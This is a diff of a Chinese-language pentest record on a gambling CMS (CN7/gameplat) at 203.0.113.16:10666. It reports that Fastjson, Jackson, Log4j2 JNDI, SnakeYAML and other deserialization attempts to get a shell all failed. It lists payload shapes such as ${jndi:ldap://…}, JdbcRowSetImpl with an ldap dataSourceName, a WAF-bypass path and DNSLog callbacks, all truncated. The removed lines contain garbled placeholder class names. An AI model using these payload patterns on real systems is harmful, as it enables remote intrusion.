@@ -8,7 +8,7 @@
 - **language**: markdown
 - **source**: self
 - **verified**: 1
-- **verified_note**: 在 203.0.113.16:10666 实测（DNSLog 自检回连正常）：Fastjson @type、Jackson default-typing(含 ["target297.example.com.Inet4Address","x.<dom>"] 构造型)、Log4j2 ${jndi:}(全头/参/body，明文面 + /ecb WAF 绕过面 + CDN 边缘层 + 全端口)、原生 Java 序列化/Hessian/Burlap/XXE/XStream/SnakeYAML(明文 + /ecb) —— 全部零 DNS 回连；/api 写接口为 @RequestParam 表单绑定、对非 JSON body 亦返 200，无 JSON→对象多态 sink。判据：后端 JSON 解析器为严格 Jackson(拒单引号/无引号键/尾逗号)、且 Spring Boot 默认日志为 Logback → 无 Log4j2。
+- **verified_note**: 在 203.0.113.16:10666 实测（DNSLog 自检回连正常）：Fastjson @type、Jackson default-typing(含 ["java.net.Inet4Address","x.<dom>"] 构造型)、Log4j2 ${jndi:}(全头/参/body，明文面 + /ecb WAF 绕过面 + CDN 边缘层 + 全端口)、原生 Java 序列化/Hessian/Burlap/XXE/XStream/SnakeYAML(明文 + /ecb) —— 全部零 DNS 回连；/api 写接口为 @RequestParam 表单绑定、对非 JSON body 亦返 200，无 JSON→对象多态 sink。判据：后端 JSON 解析器为严格 Jackson(拒单引号/无引号键/尾逗号)、且 Spring Boot 默认日志为 Logback → 无 Log4j2。
 - **path**: pocs/cn7-10666-java-deser-jndi-log4j-all-negative/poc.md
 - **tags**: negative,deserialization,jndi,log4j,fastjson,jackson,spring-boot,ecb,waf-bypass,oob,dnslog,cn7,gameplat
 - **created_at**: 2026-10-09T18:49:19.592Z
@@ -31,8 +31,8 @@ CN7/gameplat 系列博彩 CMS(5.3.0-RELEASE, Spring Boot)在 Java 反序列化/J
 https://203.0.113.16:10666 （CN7/gameplat 博彩 CMS 5.3.0-RELEASE，Spring Boot）在 **Java 反序列化 / JNDI / Log4j2 拿 shell** 方向**全否**，非 OOB 假阴性。
 
 ## 覆盖矩阵（全部实测否定，DNSLog 零回连）
-- Fastjson @type（java.lang.AutoCloseable / target297.example.com.Inet4Address / URL / InetSocketAddress / com.sun.rowset.JdbcRowSetImpl(dataSourceName=ldap://…)）→ 明文面 + /ecb 面 均零回连
-- Jackson default-typing 正确数组形态：`["com.sun.rowset.JdbcRowSetImpl",{...}]`、`["target297.example.com.Inet4Address","x.<dom>"]`、`["target297.example.com.InetAddress","x.<dom>"]`、`{"@class":...}`、nested → 零回连（default typing 未开启）
+- Fastjson @type（java.lang.AutoCloseable / java.net.Inet4Address / URL / InetSocketAddress / com.sun.rowset.JdbcRowSetImpl(dataSourceName=ldap://…)）→ 明文面 + /ecb 面 均零回连
+- Jackson default-typing 正确数组形态：`["com.sun.rowset.JdbcRowSetImpl",{...}]`、`["java.net.Inet4Address","x.<dom>"]`、`["java.net.InetAddress","x.<dom>"]`、`{"@class":...}`、nested → 零回连（default typing 未开启）
 - Log4j2 `${jndi:ldap://…}`：User-Agent/Referer/X-Api-Version/X-Forwarded-For/Origin/tenantCode + body，明文面、/ecb WAF 绕过面、CDN 边缘层（/jumpto/img 的 URL/query/Host/XFF）、全部高位端口 → 零回连
 - 原生 Java 序列化(ac ed 00 05) / Hessian2(H\x02\x00) / Burlap / XML-XXE(外部实体) / XStream(com.sun.rowset.JdbcRowSetImpl) / SnakeYAML(!!javax.script.ScriptEngineManager…URLClassLoader) → 明文面 + /ecb 面 均无 sink
 - JNDI 直填参数 url/jdbcUrl/dataSource/jndiName → 零回连
@@ -43,7 +43,7 @@ https://203.0.113.16:10666 （CN7/gameplat 博彩 CMS 5.3.0-RELEASE，Spring Boo
 3. `/api/*` 写接口普遍 `@RequestParam`(form) 绑定：`/api/tenant/setting/getConfig`、`/api/email/send` 对**完全非 JSON** body（`not-json-at-all`）仍返回 200；`/api/agent/member/addChild` 不读 JSON 里的 username → 无 JSON body → 对象 的多态映射面。JSON 体真正被解析的唯一已知通道是 /ecb 网关。
 
 ## OOB 有效性复核（消除假阴性疑虑）
-- DNSLog 管线可用：向 target300.example.com 取域后，本机解析 selfcheck.<dom> 立即回显 → 谁能解析即被记录。
+- DNSLog 管线可用：向 dnslog.cn 取域后，本机解析 selfcheck.<dom> 立即回显 → 谁能解析即被记录。
 - /jumpto/img/https://<唯一子域>/x.png 确实触发了目标侧外部 DNS 解析，来源 resolver 172.253.x.x（海外公共 DNS），但响应头含 `Via: ens-cache28.hk48`、`Eagleid`、`302 → https://www.aliyun.com/notfoundx.png`（阿里云 ENS/CDN 边缘特征）→ 该出网层是**图片代理边缘，不是 Java 源站**，故不能作为源站 egress 的证明。
 - 应用侧邮件/通知端点（/api/email/send 等）对攻击者域名零 DNS 解析，源站 egress 未获正面证明——但如上，否定结论不依赖它。
 
